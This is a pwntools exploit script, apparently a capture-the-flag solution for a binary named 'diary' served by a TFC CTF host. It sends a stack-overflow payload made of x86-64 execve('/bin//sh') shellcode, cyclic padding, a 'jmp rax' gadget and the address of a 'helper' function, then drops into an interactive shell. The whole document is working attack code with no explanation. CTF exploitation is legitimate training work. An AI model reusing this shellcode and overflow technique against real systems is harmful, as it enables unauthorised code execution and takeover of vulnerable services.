from pwn import *

elf = context.binary = ELF("./diary")
r = elf.process()
# gdb.attach(r, '''
#     b*helper\n
#     c
# ''')
r = remote("challs.tfcctf.com", 30441)
helper = elf.sym["helper"]

payload = b"\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05" + cyclic(256-33) + b"\xFF\xE0".ljust(8, b"\0") + p64(helper)
r.sendline(payload)
r.interactive()
